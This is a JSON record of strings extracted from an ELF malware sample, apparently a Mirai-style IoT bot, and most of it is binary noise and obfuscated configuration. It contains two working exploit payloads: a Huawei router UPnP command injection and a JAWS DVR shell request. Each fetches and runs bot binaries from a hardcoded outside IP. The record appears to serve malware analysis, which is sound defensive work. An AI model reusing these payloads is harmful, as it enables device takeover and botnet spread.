{
    "malware_data": [
        {
            "filename": "32a5c3d673316ed7cca78cbf3bcd9c371510edd426436126700598cf1e3a9d32.elf",
            "filetype": "7F454C46",
            "filesize": "72KB",
            "hash_sha256": "32a5c3d673316ed7cca78cbf3bcd9c371510edd426436126700598cf1e3a9d32",
            "strings": [
                "N^NuNV",
                ";hf>\"y",
                "9X QJ",
                ";hN^NuNV",
                ";jHy",
                "N^Nu",
                " OHWHQHy",
                "?>,oQ",
                "V oQ",
                "K$HB",
                "eV0;",
                "Qh/H",
                "/BQxHoQxB",
                "HoPpHoP",
                " 7- P",
                "J$HB",
                "HoQl/",
                " PtO",
                "<Hx(",
                "Ho(ta",
                "Ho(xG",
                "PHo(",
                " (la",
                "0Ho(pa",
                " (xa",
                "Ho(|a",
                " Ho(ha",
                " (pa",
                " (|a",
                "$Ho(ha",
                "Ho(la",
                " (ta",
                "2Ho(ta",
                "Ho(xa",
                "Ho(tN",
                " (|N",
                " (lN",
                "Ho(xN",
                "Ho(pN",
                "Hw) (xHx",
                "Ho(hN",
                " (pN",
                "Ho(ha",
                "Hr) ",
                "hHo(ta",
                "L$/Q",
                "Ho(hK",
                " (pM",
                "gTHo(hN",
                "Ho(t/",
                "N\"@O",
                "p F ",
                "r$/Q",
                "^\"@O",
                "X /Q",
                "l(@O",
                "e,$/",
                "g^ FJ",
                "B5) ",
                "tth(",
                " DHp",
                "? G ",
                "n GR",
                "lh J",
                "l^ J",
                "D K`",
                "Q`NuH",
                "NuNV",
                "f$/.",
                "N^Nu 9",
                "g.Hx",
                "?>&o",
                "/f4B",
                " BHh",
                "g \"H",
                "$HB(",
                " @Hh",
                "?>,o",
                "L:@K",
                "3|eX",
                "4$q,",
                "X GN",
                "T\"GN",
                "*,5@",
                "*N9@",
                ")t5@",
                ")`7@",
                "F@7@",
                "< GN",
                "4NuO",
                "?>*o",
                "(@/<",
                "F0@A",
                "J<@M",
                "4$p,",
                "VT%@",
                "H`(a",
                "V@9@",
                "V.'@",
                "$NuO",
                "?>&/",
                "(HHx",
                "h$@O",
                "`Hx@",
                "n$@O",
                " G$p",
                "Qh?@",
                "P|5@",
                "XNuO",
                "?>(o",
                "LH5@",
                "2$p,",
                "cfxBj",
                "JF%@",
                "J25@",
                "`\":|",
                "LNuO",
                "f~Bj",
                "<NuO",
                "?>$/",
                "&HHx",
                "(H/<",
                "<@Hx",
                "Bl5@",
                "?>,/",
                "&@/<",
                "&@!sh",
                ".$p,",
                "\"FHq",
                "?<(n",
                ".*HB",
                "bLHn",
                " N!<",
                "N^NuO",
                "?>./",
                "*@Hx",
                "`(HHx",
                "$ FN",
                "M\"EN",
                "M FN",
                "L\"C$F",
                "H<@M",
                " GHp",
                "Hw(P/",
                "}t/@",
                "4^7@",
                "`2/|",
                "2/|@",
                "&/|JR**",
                "DNu/",
                "BBHB",
                "BAHA",
                "BAHAJ",
                "<NuHx",
                "d$LN",
                "BDHD*",
                "UUUV\"",
                "HGBG",
                "DHx@",
                "gJ IC",
                "g: 9",
                " CHh",
                " 7- ",
                "]bB3",
                "H@B@",
                " NuHx",
                " F1@",
                "BBHB(",
                " F!B",
                "\"F3@",
                "QNB3",
                "T\"F3@",
                "h< /",
                "gn /",
                "$\"F3@",
                "KnHx@",
                "?<4.",
                "O&Hn",
                "G\\Hy",
                "GDHj",
                "wxHx",
                "vlHx",
                "80Hx",
                "LT(@P",
                "LB@S",
                "0B@S",
                "lB@S",
                "PB@S",
                "2B@S",
                "+ FN",
                "$D$/",
                "F CB",
                ">:$D$/",
                "LNu#",
                "9dNuNV",
                "9hgP=|",
                "gVHx",
                "gN=|",
                "SrHx",
                "m0/9",
                "`RB9",
                "9h=|",
                "BH/<",
                "N^Nu/",
                "g,$k",
                "$_&_NuNV",
                "gLHn",
                "?<&n",
                "+Z/.",
                "v`<E",
                "f2Bn",
                "9`Hx",
                "9\\J9",
                "zHx@",
                "l&NBca",
                "9`$<",
                "gR/9",
                "9` BN",
                "RHx@",
                "< $o",
                "$NuH",
                "8 $o",
                "$_&_NuO",
                "?>$o",
                "/^?|",
                "< CHh",
                "g6 7- ",
                "& IB",
                "gH JB",
                "NuHx",
                " AHh",
                "K:$H#",
                "<>,9",
                "<DHx",
                "d$MN",
                "<7Hx",
                "<&By",
                "< Hx",
                "<  G1|",
                "<*Hy",
                " G1@",
                "9h .",
                "gH IC",
                "&C$.",
                " DHh",
                " 6- ",
                " D/(",
                "54 .",
                "4d .",
                "fj n",
                "f, .",
                " THx@",
                "\\Hx@",
                ",Hx@",
                "h E ",
                "g0/,",
                "<BLA",
                "N^Nu\"/",
                "9jJi",
                "BCHC$",
                "<NuH",
                " 0Hx",
                "=(Hx",
                "=pHx",
                "=|Hx",
                "=.Hx",
                "=:Hx",
                "=FHx",
                "=RHx",
                "=^Hx",
                ">~Hx",
                ">$Hx",
                ">0Hx",
                "><Hx",
                ">HHx",
                ">THx",
                ">`Hx",
                ">lHx",
                "Nu o",
                "NuNq/",
                "g \"A\"",
                "Nu\"o",
                "NuNq o",
                "NuNqH",
                " 0&o",
                "?0\"o",
                "b60|",
                "eLgF ",
                "b(p7 B",
                "pW B",
                ">0,/",
                "$BHx",
                "|NuNV",
                "gF=|",
                "N^NuH",
                "< */",
                "<Nu\"o",
                "m BBS",
                "8  /",
                "gb J",
                "`Jp7",
                "` J ",
                "$NuNV",
                " A-P",
                "`V-n",
                "p7N@-@",
                "N@-@",
                "N^NuNuNV",
                "p@N@-@",
                "p6N@-@",
                "p%N@-@",
                "<0&n",
                "0 $n",
                "pUN@-@",
                "<8&n",
                "pBN@-@",
                "`h-n",
                "f(/.",
                " @N^NuNuNV",
                "eL n",
                "`j .",
                " @N^NuNV",
                "<| @N^NuNV",
                "`~ n",
                "`@ n",
                "`b n",
                "`l n",
                "lp -@",
                "`^/.",
                "b\"\"9",
                "<l .",
                "g4 .",
                "gF/.",
                " @$.",
                "f>Hy",
                "<HHy",
                "9p/.",
                "g\"\".",
                "`2/.",
                " @-P",
                "`j/.",
                "f* 9",
                "f\"/.",
                "g& .",
                "bHHy",
                "`J n",
                "e4\".",
                "`\\\".",
                "b0 .",
                "f6 n",
                "e*/.",
                "`t n",
                "g>\".",
                "f& n",
                "`& .",
                "`\"/.",
                "`*\"n",
                "fffg\"",
                "gR n",
                "fffg$",
                "f: n",
                "g*\"n",
                ";L A",
                "0f*R",
                "`2 n",
                "Ht\" ",
                "<`/.",
                "jNqNV",
                "p -@",
                "(r -A",
                "g. .",
                "HN^NuNuNV",
                "9@ <",
                "9@ p",
                "f&/.",
                "f8 9",
                "<l <",
                "<t .",
                "<h n",
                "<hHx",
                "<h-@",
                "`>-n",
                "e( n",
                "f\" .",
                "gF\".",
                "g./<",
                "<p\"<",
                "NqNuNV",
                "pfN@-@",
                "NqNV",
                "plN@-@",
                "`,-y",
                "p+N@-@",
                "LN^NuNV",
                "DN^NuNV",
                "`R n",
                "`& n",
                "`H n",
                "`> .",
                "`| n",
                "gB n",
                "mB .",
                "f4Hx",
                "f6 9",
                "f~ 9",
                "?$0|",
                "?(N^NuNV",
                "p-N@-@",
                "80&n",
                "9@ y",
                "N^NuPOST /cdn-cgi/",
                " HTTP/1.1",
                "User-Agent: ",
                "Host: ",
                "Cookie: ",
                "http",
                "url=",
                "POST",
                "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1",
                "Content-Length: 430",
                "Connection: keep-alive",
                "Accept: */*",
                "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"",
                "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 157.90.250.90 -l /tmp/.unstable -r /h0r0zx00xh0r0zx00xdefault/h0r0zx00x.mips; /bin/busybox chmod 777 * /tmp/.unstable; /tmp/.unstable huawei.exploit)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>",
                "GET /shell?cd+/tmp;rm+-rf+*;wget+ 157.90.250.90/jaws;sh+/tmp/jaws HTTP/1.1",
                "User-Agent: Hello, world",
                "Host: 127.0.0.1:80",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "abcdefghijklmnopqrstuvw012345678",
                "pe^~D670=1<1=",
                "vkkp",
                "pwckmjckj",
                "wkhkoa}",
                "`abeqhp",
                "qwav",
                "cqawp",
                "pahjape`imj",
                "5555",
                "56701",
                "567012",
                "10765",
                "<<<<<<<<",
                "644<4<62",
                "222222",
                "5445glmj",
                "|g7155",
                "nrf~`",
                "lc6|4",
                "^pa165",
                "cvkqpav",
                "pahjap",
                "kahmjq|567",
                "ph3<=",
                "CI<5<6",
                "lqjp131=",
                "pahagkie`imj",
                "psa<alkia",
                "jic|[setme",
                "tvmrepa",
                "efg567",
                "VKKP144",
                "elap~mt<",
                "ejok",
                "ewgaj`",
                "fhaj`av",
                "gep546=",
                "glejcaia",
                "m@mvagp",
                "jbhagpmkj",
                "mtgei[vp1714",
                "wswf~ocj",
                "nqejpagl",
                "teww",
                "tewwskv`",
                "wrck`ma",
                "p4pehg4jpv4h0%",
                "~lkjc|mjc",
                "~h||*",
                "~wqj55<<",
                "|il`mtg",
                "ohr567",
                "lm715<",
                "3qnIok4rm~|r",
                "3qnIok4e`imj",
                "`vaeifk|",
                "w}wpai",
                "msof",
                "vaehpao",
                "44444444",
                "56705670",
                "lqmcq74=",
                "smj5`ksw",
                "ejpwhu",
                "qjwpefha[mw[pla[lmwpkv}[kb[qjmravwa",
                "a~haeow*gki",
                "+tvkg+",
                "+a|a",
                "+ijp",
                "+wpepqw",
                "+tvkg+jap+pgt",
                "+gi`hmja",
                "+pit+",
                "+`epe+hkgeh+pit",
                "up|fkp",
                "imtw",
                "itwh",
                "fkp&Y",
                "leoem",
                "ajefha",
                "hmjq|wlahh",
                "+fmj+fqw}fk|$QJWPEFHA",
                "QJWPEFHA>$etthap$jkp$bkqj`",
                "jgkvvagp",
                "kcmj",
                "ewwskv`",
                "ajpav",
                "+`ar+sepgl`kc",
                "+`ar+imwg+sepgl`kc",
                "+wfmj+sepgl`kc",
                "+fmj+sepgl`kc",
                "+`ar+BPS@P545[sepgl`kc",
                "+`ar+BPS@P545+sepgl`kc",
                "+`ar+sepgl`kc4",
                "+apg+`abeqhp+sepgl`kc",
                "+apg+sepgl`kc",
                "eEw5606g41Bcn0",
                "PWkqvga$Ajcmja$Uqav}",
                "+apg+vawkhr*gkjb",
                "jeiawavrav$",
                "Gkjjagpmkj>$oaat)ehmra",
                "Eggatp>$pa|p+lpih(etthmgepmkj+|lpih/|ih(etthmgepmkj+|ih?u94*=(mieca+saft(.+.?u94*<",
                "Eggatp)Hejcqeca>$aj)QW(aj?u94*<",
                "Gkjpajp)P}ta>$etthmgepmkj+|)sss)bkvi)qvhajgk`a`",
                "wapGkkoma,#",
                "vabvawl>",
                "hkgepmkj>",
                "wap)gkkoma>",
                "gkjpajp)hajcpl>",
                "pvejwbav)ajgk`mjc>",
                "glqjoa`",
                "gkjjagpmkj>",
                "wavrav>$`kwevvawp",
                "wavrav>$ghkq`bheva)jcmj|",
                "Ik~mhhe+1*4$,Smj`ksw$JP$54*4?$SKS20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+15*4*6340*547$Webevm+173*72",
                "Ik~mhhe+1*4$,Smj`ksw$JP$54*4?$SKS20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+16*4*6307*552$Webevm+173*72",
                "Ik~mhhe+1*4$,Smj`ksw$JP$2*5?$SKS20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+15*4*6340*547$Webevm+173*72",
                "Ik~mhhe+1*4$,Smj`ksw$JP$2*5?$SKS20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+16*4*6307*552$Webevm+173*72",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54[55[2-$EtthaSafOmp+245*3*3$,OLPIH($hmoa$Cagok-$Ravwmkj+=*5*6$Webevm+245*3*3",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$1*5?$Pvm`ajp+1*4-",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$2*4?$Pvm`ajp+0*4?$CPF3*0?$MjbkTepl*7?$WR5?$*JAP$GHV$7*0*17724?$SKS20?$aj)QW-",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$2*5?$Pvm`ajp+0*4?$B@I?$IWMAGveshav?$Ia`me$Gajpav$TG$1*4-",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$2*5?$Pvm`ajp+0*4?$CPF3*0?$MjbkTepl*6?$WR5?$*JAP$GHV$0*0*1<3==?$SKS20?$aj)QW-",
                "Ik~mhhe+0*4$,gkitepmfha?$IWMA$=*4?$Smj`ksw$JP$2*5?$Pvm`ajp+1*4?$BqjSafTvk`qgpw-",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54*2?$vr>61*4-$Cagok+64544545$Bmvabk|+61*4",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54*<?$vr>65*4-$Cagok+64544545$Bmvabk|+65*4",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54*<?$vr>60*4-$Cagok+64544545$Bmvabk|+60*4",
                "Ik~mhhe+1*4$,Iegmjpkwl?$Mjpah$Ieg$KW$\\$54[54?$vr>77*4-$Cagok+64544545$Bmvabk|+77*4",
                "Ik~mhhe+1*4$,Smj`ksw$JP$54*4?$Smj20?$|20-$EtthaSafOmp+173*72$,OLPIH($hmoa$Cagok-$Glvkia+26*4*7646*=0",
                "?/dev/null",
                "S[kA",
                ".shstrtab",
                ".init",
                ".text",
                ".fini",
                ".rodata",
                ".ctors",
                ".dtors",
                ".data",
                ".bss"
            ]
        }
    ]
}